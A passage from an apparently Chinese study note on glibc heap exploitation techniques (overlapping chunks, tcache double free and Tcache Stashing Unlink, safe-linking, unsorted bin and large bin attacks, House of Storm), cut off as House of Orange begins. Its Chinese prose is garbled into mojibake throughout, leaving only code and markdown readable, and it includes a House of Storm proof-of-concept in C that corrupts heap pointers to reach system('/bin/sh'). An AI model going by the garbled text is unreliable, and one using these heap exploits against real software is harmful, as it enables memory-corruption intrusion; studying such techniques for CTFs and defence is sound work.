†å—ã€‚\n\n![image-20200723165755808](https://i.loli.net/2020/07/23/RlSDu1gY6TMqkoh.png)\n\nå¦‚å›¾æ‰€ç¤ºï¼Œå¦‚æœå­˜åœ¨ç¼“å†²åŒºæº¢å‡ºï¼Œç„¶åé€šè¿‡æ­£å¸¸ç”³è¯·é‡Šæ”¾æ„é€ å‡ºé‡å å †å—ã€‚\n\nå¯¹äºå·²ç»ä½¿ç”¨çš„A,B,Cä¸‰ä¸ªå †å—ï¼Œåœ¨å¤§å°æ–¹é¢æ²¡æœ‰è¦æ±‚ï¼Œå…¶ä¸­å¦‚æœAå­˜åœ¨å †æº¢å‡ºï¼Œä¸”èƒ½å¤Ÿè¦†ç›–åˆ°å †å—Bçš„sizeåŸŸ(æˆ–å­˜åœ¨å…¶ä»–æ”¹å†™æ–¹å¼ä¹Ÿèƒ½è¾¾åˆ°ç›¸åŒç›®çš„)ï¼Œå°†å †å—Bçš„sizeåŸŸçš„éƒ¨åˆ†æ”¹å†™æˆsize(B)+size(C)çš„å€¼(NMPä½ä¿æŒä¸å˜)ï¼Œç„¶åå¯¹å †å—Bè¿›è¡Œé‡Šæ”¾ï¼Œè¿™æ ·æ˜¯å¯ä»¥é€šè¿‡æ£€æŸ¥çš„ï¼Œå¹¶ä¸”èƒ½å°†B,Cè¯†åˆ«æˆä¸€ä¸ªå †å—è¿›è¡Œå¤„ç†ã€‚å…¶ä¸­åŸæœ¬Cåç»­å †å—çš„prev_sizeåŸŸä¼šè¢«å½“æˆæ•°æ®éƒ¨åˆ†å¤„ç†ï¼Œä¸èµ·æ ‡è¯†ä½œç”¨ï¼Œä½¿æ£€æŸ¥èƒ½é¡ºåˆ©é€šè¿‡ã€‚\n\nåœ¨æ­¤åŸºç¡€ä¸Šï¼Œå¯ä»¥ç»“åˆæœ€åŸºæœ¬çš„å †åˆ©ç”¨æ–¹æ³•ã€unlinkã€fastbinæ¥å¯¹å †å—è¿›è¡Œåˆ©ç”¨ã€‚\n(1) å¦‚æœCå—æˆ–è€…å…¶ä¸Šè¿˜æœ‰å…¶ä»–æœªçŸ¥å—éƒ¨åˆ†å­˜åœ¨å˜é‡æŒ‡é’ˆï¼Œåˆ™é‡‡ç”¨æœ€åŸºæœ¬å †åˆ©ç”¨æ–¹æ³•ï¼Œç›´æ¥æ„é€ æŒ‡é’ˆæ•°æ®å³å¯ã€‚\n(2) å¦‚æœå­˜åœ¨fastbinä¸­çš„å †å—ï¼Œä¸”å…¶ä¸­æƒ³æ”¹å†™çš„ç›®çš„åœ°å€ç¬¦åˆfastbinåˆ©ç”¨æ¡ä»¶ï¼Œåˆ™é‡‡ç”¨fastbinçš„æ–¹æ³•ã€‚\n(3) ç›´æ¥ç”³è¯·æ–°å †å—ï¼Œåœ¨å…¶ä¸­æ„é€ unlinkåˆ©ç”¨çš„æ¡ä»¶ï¼Œé€šè¿‡é‡Šæ”¾å †å—æ¥è§¦å‘unlinkã€‚\n\nå…·ä½“åˆ©ç”¨ä»€ä¹ˆæ–¹æ³•è§†æƒ…å†µè€Œå®šã€‚\n\n### 7. tcacheåˆ©ç”¨\n\n2.27çš„libcä¸å†å¤šè¯´ï¼ŒåŸºæœ¬æ²¡æœ‰ä»»ä½•æ£€æŸ¥ï¼Œå¯ä»¥ç›´æ¥æ„é€ double freeã€‚\n\nåœ¨libc-2.29ï¼Œtcacheæ·»åŠ äº†æ–°çš„æ£€æµ‹æœºåˆ¶ï¼Œç›¸å…³çš„æºç å¦‚ä¸‹\n\n```c\n//glibc-2.27\ntypedef struct tcache_entry\n{\n  struct tcache_entry *next;\n} tcache_entry;\n\n//glibc-2.29\ntypedef struct tcache_entry\n{\n  struct tcache_entry *next;\n  /* This field exists to detect double frees.  */\n  struct tcache_perthread_struct *key;\n} tcache_entry;\n```\n\n```c\n//glibc-2.27\ntcache_put (mchunkptr chunk, size_t tc_idx)\n{\n  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);\n  assert (tc_idx < TCACHE_MAX_BINS);\n  e->next = tcache->entries[tc_idx];\n  tcache->entries[tc_idx] = e;\n  ++(tcache->counts[tc_idx]);\n}\n\ntcache_get (size_t tc_idx)\n{\n  tcache_entry *e = tcache->entries[tc_idx];\n  assert (tc_idx < TCACHE_MAX_BINS);\n  assert (tcache->entries[tc_idx] > 0);\n  tcache->entries[tc_idx] = e->next;\n  --(tcache->counts[tc_idx]);\n  return (void *) e;\n}\n\n//glibc-2.29\ntcache_put (mchunkptr chunk, size_t tc_idx)\n{\n  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);\n  assert (tc_idx < TCACHE_MAX_BINS);\n\n  /* Mark this chunk as \"in the tcache\" so the test in _int_free will\n     detect a double free.  */\n  e->key = tcache;\t//new\n\n  e->next = tcache->entries[tc_idx];\n  tcache->entries[tc_idx] = e;\n  ++(tcache->counts[tc_idx]);\n}\n\ntcache_get (size_t tc_idx)\n{\n  tcache_entry *e = tcache->entries[tc_idx];\n  assert (tc_idx < TCACHE_MAX_BINS);\n  assert (tcache->entries[tc_idx] > 0);\n  tcache->entries[tc_idx] = e->next;\n  --(tcache->counts[tc_idx]);\n  e->key = NULL;\t//new\n  return (void *) e;\n}\n```\n\ntcacheæœºåˆ¶é¦–å…ˆä¼šåœ¨heapå¼€å¤´ä½ç½®åˆ›å»ºä¸€ä¸ªtcache_perthread_structç»“æ„ä½“æ¥ç»´æŠ¤ï¼š\n\n```c\ntypedef struct tcache_perthread_struct\n{\n  char counts[TCACHE_MAX_BINS];//0x40\n  tcache_entry *entries[TCACHE_MAX_BINS];//0x40*8\n} tcache_perthread_struct;\n```\n\nå…¶å‰0x40å­—èŠ‚ä¸ºå¯¹åº”å¤§å°tcacheçš„æ•°é‡ï¼Œå0x200ä¸ªå­—èŠ‚ä¸ºæŒ‡é’ˆæ•°ç»„ï¼ŒæŒ‡å‘tcache_entryé“¾è¡¨çš„å¤´éƒ¨æŒ‡é’ˆ\n\n![image-20201223173939891](https://i.loli.net/2020/12/23/WYiPs2Mx9DzC1fk.png)\n\nå½“chunkè¢«freeåˆ°tcacheä¸­æ—¶ï¼Œ`key`ä¼šè¢«ç½®ä¸º`tcache_perthread_struct`çš„åœ°å€ï¼Œä¹Ÿå°±æ˜¯heapå¼€å¤´çš„ä½ç½®ã€‚å½“chunkä»tcacheä¸­å–å‡ºæ¥æ—¶ï¼Œ`key`ä¼šè¢«è®¾ç½®æˆNULLã€‚æ€»è€Œè¨€ä¹‹ï¼Œå°±æ˜¯é€šè¿‡`key`æ¥è¡¨æ˜è¿™ä¸ªchunkæ˜¯å¦åœ¨tcacheä¸­ã€‚\n\nè€Œè¿™ä¸ª`key`ä¹Ÿæ˜¯libc2.29ä¸­æä¾›çš„å¯¹tcacheçš„é¢å¤–çš„æ£€æŸ¥ï¼Œå³åœ¨å°†ä¸€ä¸ªchunkæ”¾å…¥tcacheæ—¶ï¼Œä¼šæ£€æŸ¥è¯¥chunkçš„`key`æ˜¯å¦ç­‰äºtcacheç»“æ„ä½“çš„åœ°å€ï¼Œå¦‚æœæ˜¯ï¼Œåˆ™è¿›ä¸€æ­¥æ£€æŸ¥tcacheä¸­æ˜¯å¦å·²æœ‰åœ°å€ç›¸åŒçš„chunkï¼Œä»è€Œè§¦å‘double freeçš„æ£€æŸ¥æœºåˆ¶ã€‚\n\nè‹¥keyä¸º0æˆ–è€…ä¿®æ”¹chunkçš„å¤§å°ï¼Œä½¿chunkçš„sizeä¸åœ¨è¯¥tacacheå†…ï¼Œå³å¯å†æ¬¡é€ æˆdoublefreeã€‚\n\nè¿™é‡Œè®°å½•å¦ä¸€ç§é«˜ç‰ˆæœ¬tcacheçš„åˆ©ç”¨ï¼Œå«ä½œTcache Stashing Unlink Attackã€‚glibc-2.29 samllbinèŒƒå›´å†…çš„ç”³è¯·æµç¨‹ï¼š\n\n```c\nif (in_smallbin_range (nb))  \n    {  \n      idx = smallbin_index (nb);  \n      bin = bin_at (av, idx);  \n\n      if ((victim = last (bin)) != bin) //å–è¯¥ç´¢å¼•å¯¹åº”çš„small binä¸­æœ€åä¸€ä¸ªchunk  \n        {  \n          bck = victim->bk;  //è·å–å€’æ•°ç¬¬äºŒä¸ªchunk  \n      if (__glibc_unlikely (bck->fd != victim)) //æ£€æŸ¥åŒå‘é“¾è¡¨å®Œæ•´æ€§  \n        malloc_printerr (\"malloc(): smallbin double linked list corrupted\");  \n          set_inuse_bit_at_offset (victim, nb);  \n          bin->bk = bck; //å°†victimä»small binçš„é“¾è¡¨ä¸­å¸ä¸‹  \n          bck->fd = bin;  \n\n          if (av != &main_arena)  \n        set_non_main_arena (victim);  \n          check_malloced_chunk (av, victim, nb);  \n#if USE_TCACHE  \n      /* While we're here, if we see other chunks of the same size, \n         stash them in the tcache.  */  \n      size_t tc_idx = csize2tidx (nb); //è·å–å¯¹åº”sizeçš„tcacheç´¢å¼•  \n      if (tcache && tc_idx < mp_.tcache_bins) //å¦‚æœè¯¥ç´¢å¼•åœ¨tcache binèŒƒå›´  \n        {  \n          mchunkptr tc_victim;  \n\n          /* While bin not empty and tcache not full, copy chunks over.  */  \n          while (tcache->counts[tc_idx] < mp_.tcache_count  //å½“tcache binä¸ä¸ºç©ºå¹¶ä¸”æ²¡æ»¡ï¼Œå¹¶ä¸”small binä¸ä¸ºç©ºï¼Œåˆ™ä¾æ¬¡å–æœ€åä¸€ä¸ªchunkæ’å…¥åˆ°tcache biné‡Œ  \n             && (tc_victim = last (bin)) != bin)  \n        {  \n          if (tc_victim != 0)  \n            {  \n              bck = tc_victim->bk;  \n              set_inuse_bit_at_offset (tc_victim, nb);  \n              if (av != &main_arena)  \n            set_non_main_arena (tc_victim);  \n              bin->bk = bck; //å°†å½“å‰chunkä»small biné‡Œå¸ä¸‹  \n              bck->fd = bin;  \n              tcache_put (tc_victim, tc_idx);  //æ”¾å…¥tcache biné‡Œ  \n                }  \n        }  \n        }  \n#endif  \n          void *p = chunk2mem (victim);  \n          alloc_perturb (p, bytes);  \n          return p;  \n        }  \n    }  \n```\n\nä»small binä¸­å–å‡ºæœ€åä¸€ä¸ªchunkçš„æ—¶å€™ï¼Œå¯¹åŒå‘é“¾è¡¨åšäº†å®Œæ•´æ€§çš„æ£€æŸ¥ï¼Œç„¶è€Œï¼Œåé¢å°†å‰©ä½™chunkæ”¾å…¥tcache binçš„æ—¶å€™ï¼Œå´æ²¡æœ‰è¿™ä¸ªæ£€æŸ¥ã€‚å› æ­¤åªè¦ä¿®æ”¹smallbinä¸­æœ€åä¸€ä¸ªchunkçš„bkä¸ºtargetåœ°å€ï¼Œé‚£ä¹ˆé€šè¿‡å®Œæ•´æ€§æ£€æŸ¥åï¼Œå®ƒå°±è¢«æ”¾å…¥tcacheä¸­ï¼Œå°±å¯ä»¥å°†targetç”³è¯·å‡ºæ¥è¿›è¡Œåˆ©ç”¨ã€‚\n\nå€¼å¾—æ³¨æ„çš„ä¸€ç‚¹æ˜¯ï¼Œéœ€è¦ä½¿ç”¨åˆ°calloc()ï¼Œå¯ä»¥ç»•è¿‡tcacheï¼Œç›´æ¥ç”³è¯·smallbinã€‚å› æ­¤è¯¥æ–¹æ³•çš„åˆ©ç”¨æ¡ä»¶ä¸ºå¯ä»¥æ§åˆ¶smallbinçš„bkï¼Œå­˜åœ¨ä¸€æ¡tcache binï¼ˆæœªæ»¡ï¼‰å’Œä¸¤ä¸ªç›¸åŒå¤§å°çš„smallbinå­˜åœ¨çš„æ—¶å€™ï¼Œé€šè¿‡callocå‡½æ•°ç”³è¯·æ­¤å¤§å°çš„å †å—è§¦å‘å°†åä¸€ä¸ªsmallbinä¸­çš„å †å—æ’å…¥tcachebiné“¾ä¸­ã€‚\n\nglibc2.32å¼•å…¥çš„æ–°çš„é˜²å¾¡æœºåˆ¶-**safe-linking**(å¼‚æˆ–åŠ å¯†) [å‚è€ƒ](http://blog.nsfocus.net/glibc-234/)ï¼Œtcacheé“¾ä¹Ÿä»7ä¸ªå¢åˆ°16ä¸ª\n\n```c\n#define PROTECT_PTR(pos, ptr) \\\n  ((__typeof (ptr)) ((((size_t) pos) >> 12) ^ ((size_t) ptr)))\n#define REVEAL_PTR(ptr)  PROTECT_PTR (&ptr, ptr)\n```\n\nä¹Ÿå°±æ˜¯è¯´æ­¤æ—¶chunkçš„fdä¸º (&(p2->next)>>12) ^ &p1ï¼Œè‡ªå·±çš„åœ°å€>>12 ^ fd\n\nglibc2.34ä¹‹åå–æ¶ˆäº†free_hook malloc_hookç­‰\n\n### 8. unsorted bin attack\n\nåŒå‘å¾ªç¯é“¾è¡¨ï¼Œå…ˆè¿›å…ˆå‡ºï¼Œä»¥ä¸‹å‡ ç§æƒ…å†µä¼šåˆ†åˆ° unsorted bin ä¸­\n\n> 1ã€å½“ä¸€ä¸ªè¾ƒå¤§çš„ chunk è¢«åˆ†å‰²æˆä¸¤åŠåï¼Œå¦‚æœå‰©ä¸‹çš„éƒ¨åˆ†å¤§äº MINSIZEï¼Œå°±ä¼šè¢«æ”¾åˆ° unsorted bin ä¸­\n>\n> 2ã€é‡Šæ”¾ä¸€ä¸ªä¸å±äº fast bin çš„ chunkï¼Œå¹¶ä¸”è¯¥ chunk ä¸å’Œ top chunk ç´§é‚»æ—¶ï¼Œè¯¥ chunk ä¼šè¢«é¦–å…ˆæ”¾åˆ° unsorted bin ä¸­\n>\n> 3ã€å½“è¿›è¡Œ malloc_consolidate æ—¶ï¼Œå¯èƒ½ä¼šæŠŠåˆå¹¶åçš„ chunk æ”¾åˆ° unsorted bin ä¸­ï¼Œå¦‚æœä¸æ˜¯å’Œ top chunk è¿‘é‚»çš„è¯\n\nunsorted bin attack å®ç°äº†æŠŠä¸€ä¸ªè¶…çº§å¤§çš„æ•°ï¼ˆunsorted bin çš„åœ°å€ï¼‰å†™åˆ°ä¸€ä¸ªåœ°æ–¹\n\nåˆ©ç”¨æ–¹æ³•ï¼Œä¿®æ”¹unsorted binä¸­chunkçš„bkä¸ºç›®æ ‡åœ°å€-0x10ï¼Œå†å»å°†å…¶ç”³è¯·å‡ºæ¥æ—¶è¿›è¡Œä»¥ä¸‹æ“ä½œï¼š\n\n```c\n/* remove from unsorted list */\n//bck = chunk->bk\nunsorted_chunks (av)->bk = bck;\nbck->fd = unsorted_chunks (av);\n```\n\næœ€ç»ˆtargetåœ°å€-0x10çš„ä½ç½®å°±è¢«å†™å…¥äº†unsortedbinçš„åœ°å€ (unsorted_chunks (av))\n\n### 9. large bin attack \n\nå †å—ç®¡ç†å™¨ä¸­æœ€æ…¢çš„ä¸€ç§ç®¡ç†æ–¹å¼ï¼Œlargebin çš„èŒƒå›´æ˜¯ size > 0x400ï¼ˆx64ï¼‰\n\nlarge bin é‡‡ç”¨åŒé“¾è¡¨ç»“æ„ï¼Œé‡Œé¢çš„ chunk ä»å¤´ç»“ç‚¹çš„ fd æŒ‡é’ˆå¼€å§‹ï¼ŒæŒ‰å¤§å°é¡ºåºè¿›è¡Œæ’åˆ—ã€‚ä¸”ä¸åŒçš„åºå·çš„largebinçš„å·®å€¼ä¸åŒ(0x40\\*32,0x200\\*16,0x1000\\*8,0x8000*4,0x40000\\*2)\n\nå…¶chunkç»“æ„ï¼š\n\n```c\nstruct malloc_chunk {\n  INTERNAL_SIZE_T      prev_size;  /* Size of previous chunk (if free).  */\n  INTERNAL_SIZE_T      size;       /* Size in bytes, including overhead. */\n  struct malloc_chunk* fd;         /* double links -- used only if free. */\n  struct malloc_chunk* bk;\n  /* Only used for large blocks: pointer to next larger size.  */\n  struct malloc_chunk* fd_nextsize; /* double links -- used only if free. */\n  struct malloc_chunk* bk_nextsize;\n};// fd_nextsize å’Œ bk_nextsize æ¥é“¾æ¥åˆ°ä¸‹ä¸€ä¸ª size çš„å †å—å¤´éƒ¨å’Œä¸Šä¸€ä¸ª size çš„å †å—å¤´éƒ¨ï¼Œåœ¨ç›¸åŒ size çš„å †å—å†…éƒ¨å†é€šè¿‡ fd å’Œ bk æ¥è¿›è¡Œå†…éƒ¨çš„ç®¡ç†ã€‚ç±»ä¼¼æ¨ªå‘å’Œçºµå‘é“¾è¡¨\n```\n\nä¸ºäº†ç®¡ç†çš„é«˜æ•ˆï¼Œåœ¨çºµå‘é“¾è¡¨(fd_nextsize/bk_nextsize)ä¸­ï¼Œå †ç®¡ç†å™¨ç»´æŠ¤ä¸€ä¸ªå¾ªç¯çš„å•è°ƒé“¾è¡¨ï¼Œç”±æœ€å¤§çš„ sizeï¼ˆåœ¨è¿™ä¸ª index ä¸‹çš„æœ€å¤§ sizeï¼‰ä½œä¸ºè¡¨å¤´ï¼Œæœ€å°çš„ size ä½œä¸ºè¡¨å°¾ï¼Œä¸”é¦–å°¾ç›¸è¿ã€‚\n\néå†unsortedbinä»£ç å¦‚ä¸‹ï¼š\n\n```c\nif (in_smallbin_range(size)) \n{\n  victim_index = smallbin_index(size);//è·å–sizeå¯¹åº”çš„smallbinçš„index\n  bck = bin_at(av, victim_index);//bckæŒ‡å‘sizeå¯¹åº”çš„smallbinçš„é“¾è¡¨å¤´\n  //fwdæŒ‡å‘sizeå¯¹åº”çš„smallbinçš„é“¾è¡¨ä¸­çš„æ–°åŠ å…¥çš„chunk(small binä½¿ç”¨å¤´æ’æ³•)\n  fwd = bck->fd;\n}\nelse//å¦‚æœä¸å†smallbinçš„èŒƒå›´ï¼Œä¹Ÿå°±æ˜¯è¯´åœ¨large bin çš„èŒƒå›´\n{\n  victim_index = largebin_index(size);//è·å–sizeå¯¹åº”çš„large binçš„index\n  bck = bin_at(av, victim_index);//bckæŒ‡å‘sizeå¯¹åº”çš„large binçš„é“¾è¡¨å¤´\n  fwd = bck->fd;//fwdæŒ‡å‘sizeå¯¹åº”çš„large binçš„é“¾è¡¨ä¸­çš„æ–°åŠ å…¥çš„chunk\n  \n  //å¦‚æœlarge bin éç©ºï¼Œåœ¨largbinè¿›è¡ŒæŒ‰é¡ºåºæ’å…¥\n  if (fwd != bck) {\n      /* Or with inuse bit to speed comparisons */\n      size |= PREV_INUSE;\n      assert((bck->bk->size & NON_MAIN_ARENA) == 0);//é»˜è®¤ä¸å¯ç”¨assert\n      /*\n        large binä¸­çš„chunkæ˜¯æŒ‰ä»å¤§åˆ°å°æ’åˆ—çš„ï¼Œå¦‚æœsize < large bin \n        çš„æœ€åä¸€ä¸ªchunkï¼Œè¯´æ˜sizeæ˜¯è¿™ä¸ªlarge binä¸­çš„æœ€å°çš„ï¼Œæˆ‘ä»¬æŠŠå®ƒ\n        åŠ å…¥åˆ°æ­¤large binå°¾éƒ¨ã€‚\n      */\n      if ((unsigned long) (size) < (unsigned long) (bck->bk->size)) {\n          \n          fwd = bck;\n          bck = bck->bk;\n          \n          /*\n          large bin ä¸­sizeæœ€å°çš„chunkçš„fd_nextsizeä¼šæŒ‡å‘sizeæœ€å¤§çš„\n          é‚£ä¸ªchunkï¼Œä¹Ÿå°±æ˜¯é¦–éƒ¨çš„chunkã€‚åŒæ ·ï¼Œlarge bin ä¸­sizeæœ€å¤§çš„\n          chunkçš„bk_nextsizeä¼šæŒ‡å‘sizeæœ€å°çš„é‚£ä¸ªchunkã€‚\n          victimçš„bk_nextsizeæŒ‡å‘large binåŸæ¥æœ€å°çš„chunkï¼Œå®ƒçš„\n          bk_nextsizeæŒ‡å‘æœ€å¤§çš„é‚£ä¸ªchunkã€‚é‚£ä¹ˆåŸæ¥çš„æœ€å°çš„å°±æˆäº†ç¬¬äºŒå°çš„äº†ã€‚\n          æŠŠå®ƒfd_nextsizeå’Œbk_nextsizeéƒ½ä¿®æ­£ã€‚\n          */\n          victim->fd_nextsize = fwd->fd;\n          victim->bk_nextsize = fwd->fd->bk_nextsize;\n          //æœ€å¤§sizeçš„chunkçš„bk_nextsizeï¼Œå’ŒåŸæ¥æœ€å°chunkçš„bk_nextsizeéƒ½æŒ‡å‘victim\n          fwd->fd->bk_nextsize = victim->bk_nextsize->fd_nextsize = victim;\n      } \n      else //å¦‚æœvictimä¸æ˜¯large bin ä¸­æœ€å°çš„chunk\n      {\n          assert((fwd->size & NON_MAIN_ARENA) == 0);//é»˜è®¤ä¸å¯ç”¨assert\n          //ä»å¤§åˆ°å°ï¼ˆä»å¤´åˆ°å°¾ï¼‰æ‰¾åˆ°åˆé€‚çš„ä½ç½®\n          while ((unsigned long) size < fwd->size) {\n              fwd = fwd->fd_nextsize;\n              assert((fwd->size & NON_MAIN_ARENA) == 0);\n          }\n    //å¦‚æœsizeåˆšå¥½ç›¸ç­‰ï¼Œå°±ç›´æ¥åŠ å…¥åˆ°å…¶åé¢çœçš„æ”¹fd_nextsizeå’Œbk_nextsizeäº†\n          if ((unsigned long) size == (unsigned long) fwd->size)\n              fwd = fwd->fd;\n          else \n          {\n              //sizeä¸ç›¸ç­‰ï¼Œå³size>fwd->sizeï¼ŒæŠŠvictimåŠ å…¥åˆ°çºµå‘é“¾è¡¨ä¸­\n              victim->fd_nextsize = fwd;\n              victim->bk_nextsize = fwd->bk_nextsize;\n              fwd->bk_nextsize = victim;\n              victim->bk_nextsize->fd_nextsize = victim;\n          }\n          bck = fwd->bk;\n      }\n  } \n  else //å¦‚æœlarge bin ä¸ºç©ºï¼Œå°†victimåŠ å…¥åˆ°çºµå‘åˆ—è¡¨\n    victim->fd_nextsize = victim->bk_nextsize = victim;\n}\n//#define mark_bin(m, i)    ((m)->binmap[idx2block (i)] |= idx2bit (i))\nmark_bin(av, victim_index); //æŠŠvictimåŠ å…¥åˆ°çš„binçš„è¡¨ç¤ºä¸ºéç©º\n//æŠŠvictimåŠ å…¥åˆ°large binçš„é“¾è¡¨ä¸­\nvictim->bk = bck;\nvictim->fd = fwd;\nfwd->bk = victim;\nbck->fd = victim;\n```\n\nå½“å·²ç»å­˜åœ¨ä¸€ä¸ªlargebin Yå’Œunsortedbin Xï¼Œé‚£ä¹ˆå†ç”³è¯·ä¸€ä¸ªå †å—å°±ä¼šè§¦å‘unsortedbinè„±é“¾ï¼Œè®©unsortedbinä¸­chunkæ’å…¥åˆ°largebinä¸­ï¼Œå¦‚æœæ»¡è¶³ size (X) > size (Y) && index (size (X)) == index (size (Y))ï¼Œé‚£ä¹ˆ X å°±ä¼šæ’å…¥åˆ° Y çš„å‰é¢ï¼Œä»è€Œè§¦å‘è¿™ä¸€ä¸²ä»£ç è¿›è¡Œæ’å…¥ã€‚\n\n```c\n//victimæ˜¯Xã€fwdæ˜¯ä¿®æ”¹åçš„Y\n{\n    victim->fd_nextsize = fwd;//1\n    victim->bk_nextsize = fwd->bk_nextsize;//2\n    fwd->bk_nextsize = victim;//3\n    victim->bk_nextsize->fd_nextsize = victim;//4\n}\nvictim->bk = bck;\nvictim->fd = fwd;\nfwd->bk = victim;\nbck->fd = victim;\n```\n\næŠŠ 2 å¸¦å…¥ 4 å¾—åˆ°ï¼š`fwd->bk_nextsize->fd_nextsize=victim`\nåŒæ—¶ä¸‹é¢æœ‰ï¼š`bck->fd = victim;`ï¼ˆbck ä¹Ÿå°±æ˜¯ fwd->bkï¼‰ä¹Ÿå°±æ˜¯è¯´ä¹‹å‰æˆ‘ä»¬ä¼ªé€ çš„Yçš„ bk->fd è·Ÿ bk_nextsize æŒ‡å‘çš„åœ°å€è¢«æ”¹ä¸ºäº† victimï¼Œå³ tartget1 + 0x10ä¸target2 + 0x20 è¢«æ”¹ä¸ºäº† victim\n\n2.30ä»¥ä¸‹å­˜åœ¨ä¸€ä¸ªåˆ©ç”¨æ–¹æ³•å«ä½œ**House_of_storm**ï¼Œ`House_of_storm`æ˜¯ä¸€ç§ç»“åˆäº†`unsorted_bin_attack`å’Œ`Largebin_attack`çš„æ”»å‡»æŠ€æœ¯,å…¶åŸºæœ¬åŸç†å’Œ`Largebin_attack`ç±»ä¼¼ï¼Œä½†æ˜¯ä¸åŒçš„æ˜¯`Largebin_attack`åªå¯ä»¥åœ¨ä»»æ„åœ°å€å†™å‡ºchunkåœ°å€å®é™…åº”ç”¨ä¸­é™¤äº†æ³„æ¼ä¸€ä¸ªå †åœ°å€å¹¶æ²¡æœ‰ä»€ä¹ˆå…¶ä»–ç”¨å¤„ï¼Œæ‰€ä»¥å…¶åŸºæœ¬æ— å®³ã€‚è€Œ`House_of_storm`åˆ™å¯ä»¥å¯¼è‡´ä»»æ„åœ°å€åˆ†é…chunkï¼Œä¹Ÿå°±æ˜¯å¯ä»¥é€ æˆä»»æ„åœ°å€å†™çš„åæœã€‚\n\næ¼æ´åˆ©ç”¨æ¡ä»¶:\n1.éœ€è¦æ”»å‡»è€…åœ¨`largebin`å’Œ`unsorted_bin`ä¸­åˆ†åˆ«å¸ƒç½®ä¸€ä¸ªchunk è¿™ä¸¤ä¸ªchunkéœ€è¦åœ¨å½’ä½ä¹‹åå¤„äºåŒä¸€ä¸ª`largebin`çš„indexä¸­ä¸”`unsortedbin`ä¸­çš„chunkè¦æ¯”`largebin`ä¸­çš„å¤§\n2.éœ€è¦`unsorted_bin`ä¸­çš„`bkæŒ‡é’ˆ`å¯æ§\n3.éœ€è¦`largebin`ä¸­çš„`bkæŒ‡é’ˆå’Œbk_nextsize`æŒ‡é’ˆå¯æ§\n\n> ç›¸è¾ƒäº`Largebin_attack`æ¥è¯´ æ”»å‡»éœ€è¦çš„æ¡ä»¶å¤šå‡ºäº†ä¸€æ¡â€œunsorted_binä¸­çš„bkæŒ‡é’ˆå¯æ§â€ï¼Œç›¸å½“äºunsortedbin attack + largebin attack \n\n1. unsorted_bin->bk = fake_chunk #æŠŠfake_chunké“¾åˆ°äº†unsorted_binä¸­\n2. fake_chunk+0x10 = unsorted_bin #ä¼ªé€ fake_chunkçš„fd\n3. fake_chunk+0x3 = unsorted_chunk #ä¼ªé€ fake_chunkçš„size\n4. fake_chunk+0x18 = unsorted_chunk #ä¼ªé€ fake_chunkçš„bk\n\n```c\n// gcc -ggdb -fpie -pie -o house_of_storm house_of_storm.c\n#include <stdlib.h>\n#include <stdio.h>\n#include <string.h>\nstruct {\n    unsigned long  presize;\n    unsigned long  size;\n    unsigned long  fd;\n    unsigned long  bk;\n    unsigned long  fd_nextsize;\n    unsigned long  bk_nextsize;\n}chunk;\n\nint main()\n{\n    unsigned long *large_chunk,*unsorted_chunk;\n    unsigned long *fake_chunk = (unsigned long *)&chunk;\n    char *ptr;\n    \n    unsorted_chunk=malloc(0x418);\n    malloc(0X20);\n    large_chunk=malloc(0x408);\n    malloc(0x20);\n\n    free(large_chunk);\n    free(unsorted_chunk);\n    unsorted_chunk=malloc(0x418);  //large_chunkå½’ä½\n    free(unsorted_chunk);  // unsorted_chunkå½’ä½\n\n\t//é‡ç‚¹ä¸€ä¸‹3æ­¥\n    unsorted_chunk[1] = (unsigned long )fake_chunk;\n    large_chunk[1]    = (unsigned long )fake_chunk+8;\n    large_chunk[3]    = (unsigned long )fake_chunk-0x18-5;\n\n    ptr=malloc(0x48);\n    strncpy(ptr, \"/bin/sh\\x00\", 0x10);\n    system(((char *)fake_chunk + 0x10));\n    \n    return 0;\n}\n```\n\næ‰€ä»¥å½“æˆ‘ä»¬ç”³è¯·çš„sizeå’Œ`0x56`ç»è¿‡å¯¹é½åç›¸ç­‰çš„è¯ï¼Œé‚£ä¹ˆå°±å¯ä»¥æ‹¿åˆ°ä»»æ„çš„chunkã€‚\n\n0x55 : `1010101`\n\n0x56 : `1010110`\n\n`__int_malloc`åœ¨æ‹¿åˆ°chunkåè¿”å›åˆ°`__libc_malloc`ï¼Œ`__libc_malloc`ä¼šå¯¹chunkçš„è¿›è¡Œæ£€æŸ¥ï¼Œè¿™é‡Œå¦‚æœæœ‰é”™çš„è¯ä¼šç›´æ¥crashï¼Œä½†æ˜¯ç”±äºç¨‹åºæœ‰éšæœºåŒ–ï¼Œå¤šè¿è¡Œå‡ æ¬¡æ€»èƒ½æœ‰ä¸€æ¬¡æˆåŠŸçš„ã€‚\n\nåˆ©ç”¨ large bin attack åˆ†åˆ«é”™ä½å†™ä¸€ä¸ª size å’Œ bk çš„åœ°å€ï¼Œsize é”™ä½å†™äº† 0x56ï¼ˆç”±äº pie çš„åŸå› ï¼Œchunk çš„åœ°å€æ€»æ˜¯ä¸º 6 å­—èŠ‚ï¼Œä½†æ˜¯å¤´éƒ¨åœ°å€å¯èƒ½æ˜¯ 0x55 æˆ–è€… 0x56ï¼Œè¿™é‡Œéœ€è¦ 0x56 æ‰èƒ½æˆåŠŸï¼Œå› ä¸º malloc åä¼šè¿›è¡Œæ£€æµ‹ï¼‰\n\nä»¥ä¸‹æ£€æµ‹éœ€è¦æ»¡è¶³çš„è¦æ±‚ï¼Œåªéœ€æ»¡è¶³ä¸€æ¡å³å¯\n\n```c\n/*\n\t#define arena_for_chunk(ptr) \\\n    \t(chunk_non_main_arena (ptr) ? heap_for_ptr (ptr)->ar_ptr : &main_arena)\n    \n    è¿‡ä»¥ä¸‹æ£€æµ‹éœ€è¦æ»¡è¶³çš„è¦æ±‚ï¼Œåªéœ€æ»¡è¶³ä¸€æ¡å³å¯\n    1. victim ä¸º 0\n    2. IS_MMAPPED ä¸º 1\n    3. NON_MAIN_ARENA ä¸º 0\n*/\nassert(!victim || chunk_is_mmapped(mem2chunk(victim)) \n       || ar_ptr == arena_for_chunk(mem2chunk(victim)));\n```\n\nåˆ©ç”¨ unsorted bin attack åœ¨ fd çš„ä½ç½®å†™ä¸€ä¸ª main_arena + 88 çš„åœ°å€ï¼Œä»è€Œç»•è¿‡äº†æ£€æµ‹ã€‚\n\n![image-20221115172747936](https://files.catbox.moe/s5ri0y.png)\n\n### 10. House of Orange\n\næ€»ä½“æµç¨‹ï¼š\n\n1. é¢˜ç›®ä¸­æ²¡æœ‰freeï¼Œé‚£ä¹ˆé€šè¿‡ä¿®æ”¹top 